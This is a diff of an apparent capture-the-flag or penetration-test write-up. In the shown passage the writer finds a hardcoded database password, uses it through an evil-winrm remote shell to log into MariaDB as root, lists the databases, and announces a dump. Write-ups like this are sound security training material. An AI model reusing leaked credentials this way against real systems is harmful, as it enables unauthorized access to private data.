@@ -426,8 +426,7 @@ database_password=pa$$w0rd12
 Found a hardcoded password, looks like its to the DB
 
 ```python
-evil-winrm-py PS C:\Program Files\MariaDB 10.6\bin> mysql.exe -u root -p'pa$$w0rd12' -h 127.0.0.1 -e "SHOW DAT
-ABASES;"
+evil-winrm-py PS C:\Program Files\MariaDB 10.6\bin> mysql.exe -u root -p'pa$$w0rd12' -h 127.0.0.1 -e "SHOW DATABASES;"
 Database
 hsm_defense
 information_schema
@@ -437,5 +436,9 @@ performance_schema
 sys
 ```
 
-I 
+Ill dump the databases
+
+```python
+
+```
 
